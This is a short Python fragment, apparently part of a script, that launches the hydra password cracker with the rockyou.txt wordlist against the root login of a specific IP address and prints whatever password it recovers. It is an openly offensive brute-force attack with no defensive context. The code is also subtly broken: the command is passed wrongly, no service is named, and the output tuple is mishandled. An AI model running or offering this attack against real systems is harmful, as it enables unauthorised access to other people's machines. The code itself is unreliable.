output = subprocess.Popen(["hydra -l root -P rockyou.txt -t 4 72.36.89.214"], stdout = PIPE)
response = output.communicate()
password = response.split("password: ", 1)[1]
print("password is "+ password)